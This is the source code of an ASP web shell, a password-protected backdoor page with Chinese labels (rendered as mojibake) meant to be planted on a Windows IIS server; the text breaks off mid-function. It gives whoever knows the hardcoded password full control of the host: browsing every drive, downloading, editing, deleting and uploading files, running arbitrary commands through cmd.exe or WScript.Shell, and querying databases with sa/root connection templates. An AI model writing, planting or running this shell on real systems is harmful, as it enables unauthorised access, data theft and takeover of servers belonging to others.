   <%
   dim ApplicationName,Pass,URL,ServerNM,ServerIP,Action,WWWRoot,FolderPath,FName,BackUrl,RW

   Server.ScriptTimeout=50000
   On Error Resume Next
   ApplicationName = "Ð¡Æß"
   UserPass        = "bbs.iceyu.cn"
   URL             = Request.ServerVariables("URL")
   ServerNM        = Request.ServerVariables("SERVER_NAME")
   ServerIP        = Request.ServerVariables("LOCAL_ADDR")
   Action          = Request("Action")
   RootPath        = Server.MapPath(".")
   WWWRoot         = Server.MapPath("/")
   FolderPath      = Request("FolderPath")
   FName           = Request("FName")
   BackUrl         = "<meta http-equiv='refresh' content='2;URL=?Action=ShowFile'>"

   If Request("Pass")=UserPass then Session("webadmin")=UserPass
   If Session("webadmin")<>UserPass Then
     If Request.Form("Pass")<>"" Then
       If Request.Form("Pass")=UserPass Then
         Session("webadmin")=UserPass
         Response.Redirect URL
       Else
        Response.Write"ÑéÖ¤Ê§°Ü£¡"
       End If
     Else
       RW="<center style='font-size:12px'><br><br>Ð¡Æß"
       RW=RW & "<form action='" & URL & "' method='post'>"
       RW=RW & "ÃÜÂë£º<input name='Pass' type='password' size='15' style='font-size: 12px;border: menu 1px solid'>"
       RW=RW & "&nbsp;<input type='submit' value='µÇÂ¼' style='border-width: 1px'></form></center>"
       Response.Write RW
       RW=""
     End If
     Response.End
   End If%>
   <object runat='server' id='ws' scope='page' classid='clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8'></object>
   <object runat='server' id='ws' scope='page' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object>
   <object runat='server' id='fso' scope='page' classid='clsid:0D43FE01-F093-11CF-8940-00A0C9054228'></object>
   <object runat='server' id='sa' scope='page' classid='clsid:13709620-C279-11CE-A49E-444553540000'></object>
   <html>
   <head>
   <meta http-equiv="Content-Type" content="text/html; charset=gb2312">
   <title><%=ApplicationName&" - "&ServerIP%></title>
   <style type="text/css">
   <!--
     body,td {font-size: 12px;}
     body {margin-left: 0px;margin-top: 0px;margin-right: 0px;margin-bottom: 0px;
       <%If Action="" then response.write "overflow-x:hidden;overflow-y:hidden;"%>}
     input,select,textarea {font-size: 12px;}
     .border{border: menu 1px solid;}
     .submit{border-width: 1px;}
     a {color: black;text-decoration: none;}
   -->
   </style>
   <script language="javascript">
     function yesok(){
       if (confirm("È·ÈÏÒªÖ´ÐÐ´Ë²Ù×÷Âð£¿"))
           return true;
       else
           return false;
       }

     function ShowFolder(Folder){
       top.addrform.FolderPath.value = Folder;
       top.addrform.submit();
       }

     function FullForm(FName,FAction){
       top.hideform.FName.value = FName;
       if(FAction=="CopyFile"){
           DName = prompt("ÇëÊäÈë¸´ÖÆµ½Ä¿±êÎÄ¼þÈ«Ãû³Æ",FName);
           top.hideform.FName.value += "||||"+DName;
       }else if(FAction=="MoveFile"){
           DName = prompt("ÇëÊäÈëÒÆ¶¯µ½Ä¿±êÎÄ¼þÈ«Ãû³Æ",FName);
           top.hideform.FName.value += "||||"+DName;
       }else if(FAction=="CopyFolder"){
           DName = prompt("ÇëÊäÈëÒÆ¶¯µ½Ä¿±êÎÄ¼þ¼ÐÈ«Ãû³Æ",FName);
           top.hideform.FName.value += "||||"+DName;
       }else if(FAction=="MoveFolder"){
           DName = prompt("ÇëÊäÈëÒÆ¶¯µ½Ä¿±êÎÄ¼þ¼ÐÈ«Ãû³Æ",FName);
           top.hideform.FName.value += "||||"+DName;
       }else if(FAction=="NewFolder"){
           DName = prompt("ÇëÊäÈëÒªÐÂ½¨µÄÎÄ¼þ¼ÐÈ«Ãû³Æ",FName);
           top.hideform.FName.value = DName;
       }else if(FAction=="CreateMdb"){
           DName = prompt("ÇëÊäÈëÒªÐÂ½¨µÄMdbÎÄ¼þÈ«Ãû³Æ,×¢Òâ²»ÄÜÍ¬Ãû£¡",FName);
           top.hideform.FName.value = DName;
       }else if(FAction=="CompactMdb"){
           DName = prompt("ÇëÊäÈëÒªÑ¹ËõµÄMdbÎÄ¼þÈ«Ãû³Æ,×¢ÒâÎÄ¼þÊÇ·ñ´æÔÚ£¡",FName);
           top.hideform.FName.value = DName;
       }else{
           DName = "Other";
       }

       if(DName!=null){
         top.hideform.Action.value = FAction;
         top.hideform.submit();
       }else{
         top.hideform.FName.value = "";
       }
     }

     function DbCheck(){
       if(DbForm.DbStr.value == ""){
         alert("ÇëÏÈÁ¬½ÓÊý¾Ý¿â");
         FullDbStr(0);
         return false;
       }
       return true;
     }

     function FullDbStr(i){
      if(i<0){
        return false;
      }
       Str = new Array(12);
       Str[0] = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=<%=RePath(Session("FolderPath"))%>\\DbName.mdb;Jet OLEDB:Database Password=***";
       Str[1] = "Driver={Sql Server};Server=<%=ServerIP%>,1433;Database=DbName;Uid=sa;Pwd=****";
       Str[2] = "Driver={MySql};Server=<%=ServerIP%>;Port=3306;Database=DbName;Uid=root;Pwd=****";
       Str[3] = "Dsn=DsnName";
       Str[4] = "SELECT * FROM [TableName] WHERE ID<100";
       Str[5] = "INSERT INTO [TableName](USER,PASS) VALUES(\'username\',\'password\')";
       Str[6] = "DELETE FROM [TableName] WHERE ID=100";
       Str[7] = "UPDATE [TableName] SET USER=\'username\' WHERE ID=100";
       Str[8] = "CREATE TABLE [TableName](ID INT IDENTITY (1,1) NOT NULL,USER VARCHAR(50))";
       Str[9] = "DROP TABLE [TableName]";
       Str[10]= "ALTER TABLE [TableName] ADD COLUMN PASS VARCHAR(32)";
       Str[11]= "ALTER TABLE [TableName] DROP COLUMN PASS";
       Str[12]= "µ±Ö»ÏÔÊ¾Ò»ÌõÊý¾ÝÊ±¼´¿ÉÏÔÊ¾×Ö¶ÎµÄÈ«²¿×Ö½Ú£¬¿ÉÓÃÌõ¼þ¿ØÖÆ²éÑ¯ÊµÏÖ.\n³¬¹ýÒ»ÌõÊý¾ÝÖ»ÏÔÊ¾×Ö¶ÎµÄÇ°ÎåÊ®¸ö×Ö½Ú¡£";
       if(i<=3){
         DbForm.DbStr.value = Str[i];
         DbForm.SqlStr.value = "";
         SFSO.innerHTML="<center>ÇëÈ·ÈÏ¼ºÁ¬½ÓÊý¾Ý¿âÔÙÊäÈëSQL²Ù×÷ÃüÁîÓï¾ä¡£</center>";
       }else if(i==12){
         alert(Str[i]);
       }else{
         DbForm.SqlStr.value = Str[i];
       }
       return true;
     }

     function FullSqlStr(str,pg){
       if(DbForm.DbStr.value.length<5){
         alert("Çë¼ì²éÊý¾Ý¿âÁ¬½Ó´®ÊÇ·ñÕýÈ·!")
         return false;
       }
       if(str.length<10){
         alert("Çë¼ì²éSQLÓï¾äÊÇ·ñÕýÈ·!")
         return false;
       }
       DbForm.SqlStr.value = str ;
       DbForm.Page.value = pg;
       SFSO.innerHTML="";
       DbForm.submit();
       return true;
     }

   function CheckAll(){
     for (var i=0;i<DownId.length;i++) DownId[i].checked=!DownId[i].checked;
   }
   function Url(){
     for (var i=0;i<DownId.length;i++)
    {
     if (DownId[i].checked==true)
     {
       temp.value+=DownId[i].value+"\n";
     }
    }
     if (temp.value=="")
     {
       window.alert("Äã»¹Ã»ÓÐÑ¡ÔñÒªÏÂÔØµÄµØÖ·£¡");
       return false;}
     else
     {
       js=temp.createTextRange();
       js.execCommand("Copy");
       temp.value="";
       window.alert("¸´ÖÆÍê±Ï£¡¼ÇµÃÔÚ¸´ÖÆÖ®Ç°´ò¿ªÏÂÔØ¹¤¾ß¼àÊÓ¼ôÌù°å¡£");
      }
   }
   </script>
   <meta http-equiv="Content-Type" content="text/html; charset=gb2312">
   </head>
   <body onmouseover="window.status='Powered by:9110085';return true">
   <%

   Dim ObT(13,1)
   ObT(0,0) = "Scripting.FileSystemObject"
     ObT(0,1) = "ÎÄ¼þ²Ù×÷×é¼þ"
   ObT(1,0) = "wscript.shell"
     ObT(1,1) = "ÃüÁîÐÐÖ´ÐÐ×é¼þ"
   ObT(2,0) = "ADOX.Catalog"
     ObT(2,1) = "ACCESS½¨¿â×é¼þ"
   ObT(3,0) = "JRO.JetEngine"
     ObT(3,1) = "ACCESSÑ¹Ëõ×é¼þ"
   ObT(4,0) = "Scripting.Dictionary"
     ObT(4,1) = "Êý¾ÝÁ÷ÉÏ´«¸¨Öú×é¼þ"
   ObT(5,0) = "Adodb.connection"
     ObT(5,1) = "Êý¾Ý¿âÁ¬½Ó×é¼þ"
   ObT(6,0) = "Adodb.Stream"
     ObT(6,1) = "Êý¾ÝÁ÷ÉÏ´«×é¼þ"
   ObT(7,0) = "SoftArtisans.FileUp"
     ObT(7,1) = "SA-FileUp ÎÄ¼þÉÏ´«×é¼þ"
   ObT(8,0) = "LyfUpload.UploadFile"
     ObT(8,1) = "ÁõÔÆ·åÎÄ¼þÉÏ´«×é¼þ"
   ObT(9,0) = "Persits.Upload.1"
     ObT(9,1) = "ASPUpload ÎÄ¼þÉÏ´«×é¼þ"
   ObT(10,0) = "JMail.SmtpMail"
     ObT(10,1) = "JMail ÓÊ¼þÊÕ·¢×é¼þ"
   ObT(11,0) = "CDONTS.NewMail"
     ObT(11,1) = "ÐéÄâSMTP·¢ÐÅ×é¼þ"
   ObT(12,0) = "SmtpMail.SmtpMail.1"
     ObT(12,1) = "SmtpMail·¢ÐÅ×é¼þ"
   ObT(13,0) = "Microsoft.XMLHTTP"
     ObT(13,1) = "Êý¾Ý´«Êä×é¼þ"

   Function IsObj(obt)
     dim i,T
     on error resume next
       Set T=Server.CreateObject(obt)
       If -2147221005 <> Err Then
         IsObj=True
       Else
         IsObj=false
         Err.Clear
       End If
       Set T=Nothing
   End Function

   sub ShowErr()
     If Err Then
       Response.Write"<br><a href='javascript:history.back()'>&nbsp;" & Err.Description & "</a>"
       Err.Clear:Response.Flush
     End If
   end sub

   Function RePath(S)
     RePath=Replace(S,"\","\\")
   End Function

   Function RRePath(S)
     RRePath=Replace(S,"\\","\")
   End Function

   Function HTMLEncode(S)
     if not isnull(S) then
       S = replace(S, ">", "&gt;")
       S = replace(S, "<", "&lt;")
       S = replace(S, CHR(39), "&#39;")
       S = replace(S, CHR(34), "&quot;")
       S = replace(S, CHR(20), "&nbsp;")
       HTMLEncode = S
     end if
   End Function

   If FolderPath<>"" then
     Session("FolderPath")=RRePath(FolderPath)
   End If

   If Session("FolderPath")="" Then
     FolderPath=RootPath
     Session("FolderPath")=FolderPath
   End if

   dim fso,osm,ads,rs,conn

   Function MainMenu()
     RW="<form name='hideform' method='post' action='" & URL & "' target='FileFrame'>"
     RW=RW & "<input type='hidden' name='Action'><input type='hidden' name='FName'></form>"
     RW=RW & "<table width='100%' height='100%'  border='0' cellpadding='0' cellspacing='0' bgcolor='menu'>"
     RW=RW & "<tr><td height='20'>"
     RW=RW & "<table width='100%' height='20'  border='0' cellpadding='0' cellspacing='0'>"
     RW=RW & "<form name='addrform' method='post' action='" & URL & "' target='_parent'>"
     RW=RW & "<tr><td width='60' align='center'>µØÖ·À¸£º</td><td>"
     RW=RW & "<input name='FolderPath' style='width:100%' value='" & Session("FolderPath") & "' style='border:black 1px solid;'>"
     RW=RW & "</td><td width='60' align='center'><input name='Submit' type='submit' value='×ªµ½' class='submit'>"
     RW=RW & "</td></tr></form></table></td></tr><tr><td height='20'>&nbsp;ÎÄ¼þ²Ù×÷£º"
     Set SFSO=New LBF:SFSO.ShowDriver():Set SFSO=Nothing
     RW=RW & "<a href='javascript:ShowFolder(""C:\\Progra~1"")'>[³ÌÐòÎÄ¼þ]</a>&nbsp;<a href='javascript:ShowFolder(""C:\\Docume~1"")'>[ÎÒµÄÎÄµµ]</a>&nbsp;"
     RW=RW & "<a href='javascript:ShowFolder("""&RePath(WWWRoot)&""")'>[ÍøÕ¾Ä¿Â¼]</a></tr></td><tr><td height='20'>"
     RW=RW & "&nbsp;ÇÐ»»¹¦ÄÜ£º<a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\NewFolder")&""",""NewFolder"")'>[ÐÂ½¨Ä¿Â¼]</a>&nbsp;"
     RW=RW & "<a href='?Action=EditFile' target='FileFrame'>[ÐÂ½¨ÎÄ±¾]</a>&nbsp;<a href='?Action=UpFile' target='FileFrame'>[ÎÄ¼þÉÏ´«]</a>&nbsp;"
     RW=RW & "<a href='?Action=CmdShell' target='FileFrame'>[CMDÃüÁîÐÐ]</a>&nbsp;<a href='?Action=TSearch' target='FileFrame'>[ËÑË÷ÒýÇæ]</a>&nbsp;"
     RW=RW & "<a href='?Action=Course' target='FileFrame'>[ÏµÍ³·þÎñ]</a>&nbsp;<a href='?Action=TRegedit' target='FileFrame'>[×¢²á±í²Ù×÷]</a>&nbsp;"
     RW=RW & "<a href='?Action=ServerInfo' target='FileFrame'>[·þÎñÆ÷ÐÅÏ¢]</a></td></tr><tr><td height='20'>&nbsp;Êý¾Ý¿â¹¦ÄÜ£º<a href='?Action=DbManager' target='FileFrame'>[Êý¾Ý¿â²Ù×÷]</a>&nbsp;"
     RW=RW & "<a href='?Action=ToMdb' target='FileFrame'>[³ÌÐò´ò°üÈë¿â/³ö¿â]</a>&nbsp;|&nbsp;<a href='?Action=Logout' target='_top'>[ÍË³öµÇÂ¼]</a>"
     RW=RW & "<tr><td><iframe name='FileFrame' src='?Action=ShowFile' width='100%' height='100%' frameborder='1' scrolling='yes'></iframe></td></tr></table>"
     Response.Write RW
     RW=""
   End Function

   if request("DownFile")<>"" then call DownFile(request("DownFile"))
   Function DownFile(Path)
     Response.Clear
     On Error Resume Next
     Set osm = CreateObject(ObT(6,0))
     osm.Open
     osm.Type = 1
     osm.LoadFromFile Path
     sz=InstrRev(path,"\")+1
       Response.AddHeader "Content-Disposition", "attachment; filename=" & Mid(path,sz)
       Response.AddHeader "Content-Length",osm.Size
       Response.Charset = "UTF-8"
       Response.ContentType = "application/octet-stream"
       Response.BinaryWrite osm.Read
       Response.Flush
     osm.Close
     Set osm = Nothing
     Response.End
   End Function

   Class LBF
     Private Sub Class_Initialize
       Set fso=CreateObject(ObT(0,0))
     End Sub

     Private Sub Class_Terminate
       Set fso=Nothing
     End Sub

   Function ShowDriver()
     dim D
     For Each D in fso.Drives
       RW=RW&"<a href='javascript:ShowFolder("""&D.DriveLetter&":\\"")'>´ÅÅÌ["&D.DriveLetter&":]</a>&nbsp;"
     Next
       ShowDriver=RW
   End Function

   Function ShowFile(Path)
     dim F,L,Fold,i

     RW="<table border='0' cellpadding='2' width='800' height='100%' bgcolor='#EFEFEF' align='center'>"
     RW=RW & "<tr><td width='200' valign='top'>"
     RW=RW & "<table border='0'  cellpadding='0' cellspacing='0' width='100%'>"
     RW=RW & "<tr><td width='100%'></td></tr>"
     Set FOLD=fso.GetFolder(Path)
     For Each F in FOLD.subfolders
     RW=RW & "<tr><td width='100%' height='20'><a href='javascript:ShowFolder("""&RePath(Path&"\"&F.Name)&""")'>["&F.Name&"]</a>"
     RW=RW & "&nbsp;|<a href='javascript:FullForm("""&Replace(Path&"\"&F.Name,"\","\\")&""",""DelFolder"")' onclick='return yesok()'>É¾³ý</a>"
     RW=RW & "&nbsp;<a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""CopyFolder"")' onclick='return yesok()'>¸´ÖÆ</a>"
     RW=RW & "&nbsp;<a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""MoveFolder"")' onclick='return yesok()'>ÒÆ¶¯</a></td></tr>"
     Next
     RW=RW & "</table></td><td width='600' valign='top' bgcolor='#FFFFFF'><table border='0'  cellspacing='1' cellpadding='0' cellspacing='0' width='100%'>"
     Response.Write RW : RW=""

     For Each L in Fold.files
     i=i+1
     RW="<tr onMouseOver=""this.className='tr'"" onMouseOut=""this.className=''""> "
     RW=RW & "<td width='45%' ><input type='checkbox' name='DownId' value='http://"&ServerNM&URL&"?Pass="&UserPass&"&DownFile="&RePath(Path&"\"&L.Name)&"'>"
     RW=RW & "<a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DownFile"");' title='ÏÂÔØ'>"&L.Name&"</a></td>"
     RW=RW & "<td width='10%'>"&clng(L.size/1024)&"K</td>"
     RW=RW & "<td width='20%' align='center'>" & year(L.DateLastModified) & "-" & right("0"&month(L.DateLastModified),2) & "-" & right("0"&day(L.DateLastModified),2) & " " & FormatDateTime(L.DateLastModified,4)
     RW=RW & "<td width='25%' align='center'><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""EditFile"")'>±à¼</a>&nbsp;"
     RW=RW & "<a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DelFile"")'  onclick='return yesok()'>É¾³ý</a>&nbsp;"
     RW=RW & "<a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""CopyFile"")'>¸´ÖÆ</a>&nbsp;"
     RW=RW & "<a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""MoveFile"")'>ÒÆ¶¯</a></td></td></tr>"
     Response.Write RW : RW=""
     Next
     if i>0 then Response.Write "<tr><td><br><input type='checkbox' name='all' value='all' onClick='CheckAll()'>·´ÏòÑ¡Ôñ&nbsp;<input type='submit' value='ÅúÁ¿ÏÂÔØ' name='downurl' style='width:80' onClick='Url()' class='submit'><div style=display:'none'><textarea rows='0' name='temp' cols='0'></textarea></div></td></tr>"
     i=0
     Response.Write "</table></td></tr></table>"
     Set FOLD=Nothing
   End Function

   Function EditFile(Path)
   dim T
     If Request("Action2")="Post" Then
         Set T=fso.CreateTextFile(Path)
           T.WriteLine Request.form("content")
           T.close
         Set T=Nothing
         Set fso=Nothing
       RW="<center><br><br><br>ÎÄ¼þ±£´æ³É¹¦£¡</center>"
       RW=RW & BackUrl
       Response.Write RW : RW=""
       Response.End
     End If

     If Path<>"" Then
       Set T=fso.opentextfile(Path, 1, False)
       On Error Resume Next
       Txt=HTMLEncode(T.readall)
       if err then err.Clear
       T.close
       Set T=Nothing
     Else
       Path=Session("FolderPath")&"\newfile.asp":Txt="ÐÂ½¨ÎÄ¼þ"
     End If

     RW="<br><table width='600' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>"
     RW=RW&"<Form action='"&URL&"?Action2=Post' method='post' name='EditForm'><tr><td height='20' align='center' bgcolor='menu'>ÎÄ±¾±à¼Æ÷</td></tr>"
     RW=RW&"<tr><td bgcolor='#FFFFFF' align='center'><input name='Action' value='EditFile' Type='hidden'>"
     RW=RW&"<input name='FName' value='"&Path&"' style='width:580' class='border'></td></tr>"
     RW=RW&"<tr><td bgcolor='#FFFFFF' align='center'><textarea name='Content' style='width:580;height:450' class='border'>"&Txt&"</textarea></td></tr>"
     RW=RW&"<tr><td bgcolor='#FFFFFF' align='center'><input name='goback' type='button' value='·µ»Ø' onclick='history.back();' class='submit'>&nbsp;&nbsp;&nbsp;<input name='reset' type='reset' value='ÖØÖÃ' class='submit'>&nbsp;&nbsp;&nbsp;<input name='submit' type='submit' value='±£´æ' class='submit'>"
     RW=RW&"</td></tr></form></table>"
     Response.Write RW : RW=""
   End Function

   Function DelFile(Path)
     If fso.FileExists(Path) Then
       fso.DeleteFile Path
       RW="<center><br><br><br>ÎÄ¼þ "&Path&" É¾³ý³É¹¦£¡</center>"
       RW=RW & BackUrl
       Response.Write RW
     End If
   End Function

   Function CopyFile(Path)
     Path = Split(Path,"||||")
       If fso.FileExists(Path(0)) and Path(1)<>"" Then
         fso.CopyFile Path(0),Path(1)
         RW="<center><br><br><br>ÎÄ¼þ" & Path(0) & "¸´ÖÆ³É¹¦£¡</center>"
         RW=RW & BackUrl
         Response.Write RW : RW=""
       End If
   End Function

   Function MoveFile(Path)
     Path = Split(Path,"||||")
       If fso.FileExists(Path(0)) and Path(1)<>"" Then
         fso.MoveFile Path(0),Path(1)
         RW="<center><br><br><br>ÎÄ¼þ" & Path(0) & "ÒÆ¶¯³É¹¦£¡</center>"
         RW=RW & BackUrl
         Response.Write RW : RW=""
       End If
   End Function

   Function DelFolder(Path)
       If fso.FolderExists(Path) Then
         fso.DeleteFolder Path
         RW="<center><br><br><br>Ä¿Â¼" & Path & "É¾³ý³É¹¦£¡</center>"
         RW=RW & BackUrl
         Response.Write RW : RW=""
       End If
   End Function

   Function CopyFolder(Path)
     Path = Split(Path,"||||")
       If fso.FolderExists(Path(0)) and Path(1)<>"" Then
         fso.CopyFolder Path(0),Path(1)
         RW="<center><br><br><br>Ä¿Â¼" & Path(0) & "¸´ÖÆ³É¹¦£¡</center>"
         RW=RW & BackUrl
         Response.Write RW : RW=""
       End If
   End Function

   Function MoveFolder(Path)
     Path = Split(Path,"||||")
       If fso.FolderExists(Path(0)) and Path(1)<>"" Then
         fso.MoveFolder Path(0),Path(1)
         RW="<center><br><br><br>Ä¿Â¼" & Path(0) & "ÒÆ¶¯³É¹¦£¡</center>"
         RW=RW & BackUrl
         Response.Write RW : RW=""
       End If
   End Function

   Function NewFolder(Path)
       If Not fso.FolderExists(Path) and Path<>"" Then
         fso.CreateFolder Path
         RW="<center><br><br><br>Ä¿Â¼" & Path & "ÐÂ½¨³É¹¦£¡</center>"
         RW=RW & BackUrl
         Response.Write RW : RW=""
       End If
   End Function
   End Class

   Function UpFile()
     dim strFileName
     If Request("Action2")="Post" Then
       Set U=new UPC : Set F=U.UA("LocalFile")
       UName=U.form("ToPath")
       If UName="" Or F.FileSize=0 then
         RW="<br>ÇëÊäÈëÉÏ´«µÄÍêÈ«Â·¾¶ºóÑ¡ÔñÒ»¸öÎÄ¼þÉÏ´«!"
       Else
           F.SaveAs UName
           If Err.number=0 Then
             RW="<center><br><br><br>ÎÄ¼þ" & UName & "ÉÏ´«³É¹¦£¡</center>"
           End if
       End If
       Set F=nothing:Set U=nothing
       RW=RW & BackUrl
       Response.Write RW
       ShowErr()
       Response.End
     End If
       RW="<br><table width='600' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>"
       RW=RW & "<form name='UpForm' method='post' action='"&URL&"?Action=UpFile&Action2=Post' enctype='multipart/form-data'>"
       RW=RW & "<tr><td height='20' align='center' bgcolor='menu'>ÉÏ´«ÎÄ¼þ</td></tr>"
       RW=RW & "<tr><td align='center' bgcolor='#FFFFFF'>"
       RW=RW & "ÉÏ´«Â·¾¶£º<input name='ToPath' value='"&RRePath(Session("FolderPath")&"\newup.asp")&"' style='width:250' class='border'>&nbsp;"
       RW=RW & "<input name='LocalFile' type='file' style='width:225' class='border'>&nbsp;"
       RW=RW & "<input type='submit' name='Submit' value='ÉÏ´«' class='submit'>"
       RW=RW & "</td></tr></form></table>"
     Response.Write RW
   End Function

   Dim T1
   Class UPC
     Dim D1,D2

     Public Function Form(F)
       F=lcase(F)
       If D1.exists(F) then:Form=D1(F):else:Form="":end if
     End Function

     Public Function UA(F)
       F=lcase(F)
       If D2.exists(F) then:set UA=D2(F):else:set UA=new FIF:end if
     End Function

     Private Sub Class_Initialize
     Dim TDa,TSt,vbCrlf,TIn,DIEnd,T2,TLen,TFL,SFV,FStart,FEnd,DStart,DEnd,UpName
       set D1=CreateObject("Scripting.Dictionary")
       if Request.TotalBytes<1 then Exit Sub
       set T1 = CreateObject(ObT(6,0))
       T1.Type = 1 : T1.Mode =3 : T1.Open
       T1.Write  Request.BinaryRead(Request.TotalBytes)
       T1.Position=0 : TDa =T1.Read : DStart = 1
       DEnd = LenB(TDa)
       set D2=CreateObject("Scripting.Dictionary")
       vbCrlf = chrB(13) & chrB(10)
       set T2 = CreateObject(ObT(6,0))
       TSt = MidB(TDa,1, InStrB(DStart,TDa,vbCrlf)-1)
       TLen = LenB (TSt)
       DStart=DStart+TLen+1
       while (DStart + 10) < DEnd
         DIEnd = InStrB(DStart,TDa,vbCrlf & vbCrlf)+3
         T2.Type = 1 : T2.Mode =3 : T2.Open
         T1.Position = DStart
         T1.CopyTo T2,DIEnd-DStart
         T2.Position = 0 : T2.Type = 2 : T2.Charset ="gb2312"
         TIn = T2.ReadText : T2.Close
         DStart = InStrB(DIEnd,TDa,TSt)
         FStart = InStr(22,TIn,"name=""",1)+6
         FEnd = InStr(FStart,TIn,"""",1)
         UpName = lcase(Mid (TIn,FStart,FEnd-FStart))
         if InStr (45,TIn,"filename=""",1) > 0 then
           set TFL=new FIF
           FStart = InStr(FEnd,TIn,"filename=""",1)+10
           FEnd = InStr(FStart,TIn,"""",1)
           FStart = InStr(FEnd,TIn,"Content-Type: ",1)+14
           FEnd = InStr(FStart,TIn,vbCr)
           TFL.FileStart =DIEnd
           TFL.FileSize = DStart -DIEnd -3
           if not D2.Exists(UpName) then
             D2.add UpName,TFL
           end if
         else
           T2.Type =1 : T2.Mode =3 : T2.Open
           T1.Position = DIEnd : T1.CopyTo T2,DStart-DIEnd-3
           T2.Position = 0 : T2.Type = 2
           T2.Charset ="gb2312"
           SFV = T2.ReadText
           T2.Close
           if D1.Exists(UpName) then
             D1(UpName)=D1(UpName)&", "&SFV
           else
             D1.Add UpName,SFV
           end if
         end if
         DStart=DStart+TLen+1
       wend
       TDa=""
       set T2 =nothing
     End Sub

     Private Sub Class_Terminate
       if Request.TotalBytes>0 then
         D1.RemoveAll:D2.RemoveAll
         set D1=nothing:set D2=nothing
         T1.Close:set T1 =nothing
       end if
     End Sub
   End Class

   Class FIF
   dim FileSize,FileStart
     Private Sub Class_Initialize
     FileSize = 0
     FileStart= 0
     End Sub

     Public function SaveAs(F)
     dim T3
     SaveAs=true
     if trim(F)="" or FileStart=0 then exit function
     set T3=CreateObject(ObT(6,0))
        T3.Mode=3 : T3.Type=1 : T3.Open
        T1.position=FileStart
        T1.copyto T3,FileSize
        T3.SaveToFile F,2
        T3.Close
        set T3=nothing
        SaveAs=false
      end function
   End Class

   Function CmdShell()
     dim checked,DefCmd,CM,DD,aaa,szTempFile,oFilelcx
     If Request("SP")<>"" Then Session("ShellPath") = Request("SP")
     ShellPath=Session("ShellPath")
     if ShellPath="" Then ShellPath = "cmd.exe"
     if Request("wscript")="yes" then
     checked=" checked"
     else
     checked=""
     end if
     If Request("cmd")<>"" Then DefCmd = Request("cmd")
     RW="<br><table width='600' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'><form method='post'>"
     RW=RW & "<tr><td height='20' align='center' bgcolor='menu'>CmdÃüÁîÐÐ</td></tr>"
     RW=RW & "<tr><td align='center' bgcolor='#FFFFFF'>SHELLÂ·¾¶£º<input name='SP' value='" & ShellPath & "' style='width:400' class='border'>&nbsp;"
     RW=RW & "<input type='checkbox' name='wscript' value='yes'" & checked & ">WScript.Shell</td></tr>"
     RW=RW & "<tr><td align='center' bgcolor='#FFFFFF'><input name='cmd'  style='width:538' value='" & DefCmd & "' class='border'>&nbsp;<input type='submit' value='Ö´ÐÐ' class='submit'></td><tr>"
     RW=RW & "<tr><td align='center' bgcolor='#FFFFFF'><textarea  style='width:580;height:450' class='border'>"
     If Request.Form("cmd")<>"" Then
     if Request.Form("wscript")="yes" then
     Set CM=CreateObject(ObT(1,0))
     Set DD=CM.exec(ShellPath&" /c "&DefCmd)
     aaa=DD.stdout.readall
     RW=RW & aaa
     Set CM=Nothing
     Set DD=Nothing
     else
     szTempFile = server.mappath("cmd.txt")
     Call ws.Run (ShellPath & " /c " & DefCmd & " > " & szTempFile, 0, True)
     Set fso=CreateObject(ObT(0,0))
     Set oFilelcx=fso.OpenTextFile (szTempFile, 1, False, 0)
     aaa=Server.HTMLEncode(oFilelcx.ReadAll)
     oFilelcx.Close
     Call fso.DeleteFile(szTempFile, True)
     RW=RW & aaa
     Set oFilelcx=Nothing
     Set fso=Nothing
     end if
     End If
     RW=RW & chr(13) & "</textarea></td></tr></form></table>"

     Response.Write RW : RW="" : aaa=""
   End Function

   Function TSearch()
     dim st
     st=timer()

     RW="<br><table width='600' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'><form method='post'>"
     RW=RW & "<tr><td height='20' align='center' bgcolor='menu'>ËÑË÷ÒýÇæ</td></tr>"
     RW=RW & "<tr><td bgcolor='#FFFFFF'>&nbsp;Â·&nbsp;&nbsp;¾¶£º<input name='SFpath' value='" & WWWRoot & "' style='width:390' class='border'>&nbsp;×¢:¶àÂ·¾¶Ê¹ÓÃ"",""ºÅÁ¬½Ó.</td></tr>"
     RW=RW & "<tr><td bgcolor='#FFFFFF'>&nbsp;¹Ø¼ü×Ö£º<input name='Sfk' style='width:200' class='border'>&nbsp;<input type='submit' value='ËÑË÷' class='submit'></td></tr>"
     RW=RW & "</form></table>"
     Response.Write RW : RW=""

     if Request.Form("Sfk")<>"" then
     Set newsearch=new SearchFile
     newsearch.Folders=trim(Request.Form("SFpath"))
     newsearch.keyword=trim(Request.Form("Sfk"))
     newsearch.Search
     Set newsearch=Nothing
     Response.Write "·ÑÊ±£º"&(timer()-st)*1000&"ºÁÃë<hr>"
     end if

   End Function

   Class SearchFile
    dim Folders,keyword,objFso,Counter

    Private Sub Class_Initialize
     Set objFso=Server.CreateObject(ObT(0,0))
     Counter=0
    End Sub

    Private Sub Class_Terminate
       Set objFso=Nothing
    End Sub

    Function Search
     Folders=split(Folders,",")

     flag=instr(keyword,"\") or instr(keyword,"/")
     flag=flag or instr(keyword,":")
     flag=flag or instr(keyword,"|")
     flag=flag or instr(keyword,"&")

     if flag then
       Response.Write "<table align='center' width='600'><hr><p align='center'><font color='red'>¹Ø¼ü×Ö²»ÄÜ°üº¬/\:|&</font><br>"
    Exit Function
     else
       Response.Write "<table align='center' width='600'><hr>"
     end if

     dim i
     for i=0 to ubound(Folders)
       Call GetAllFile(Folders(i))
     next
     Response.Write "<p align='center'>¹²ËÑË÷µ½<font color='red'>"&Counter&"</font>¸ö½á¹û<br>"
    End Function

    Private Function GetAllFile(Folder)
     dim objFd,objFs,objFf
     Set objFd=objFso.GetFolder(Folder)
     Set objFs=objFd.SubFolders
     Set objFf=objFd.Files

     dim strFdName
     On Error Resume Next
     For Each OneDir In objFs
       strFdName=OneDir.Name
